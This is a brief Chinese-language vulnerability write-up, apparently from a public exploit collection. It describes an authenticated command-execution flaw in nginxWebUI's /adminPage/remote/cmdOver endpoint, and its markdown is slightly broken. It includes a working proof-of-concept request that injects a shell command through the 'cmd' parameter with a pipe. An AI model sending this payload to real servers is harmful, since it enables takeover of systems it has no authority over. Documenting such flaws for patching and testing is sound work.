# nginxWebUI cmdOver 后台命令执行漏洞

## 漏洞描述
nginxWebUI 后台存在命令执行漏洞，攻击者登录后台后可以执行任意命令获取服务器权限

## 危害等级
CRITICAL

## 参考链接

## 漏洞复现方法
登录页面

![image-20220628112638269](images/202206281126396.png)



验证请求包

```
POST /adminPage/remote/cmdOver

## Payloads
```
POST /adminPage/remote/cmdOver

remoteId=local&cmd=start|id&interval=1
```
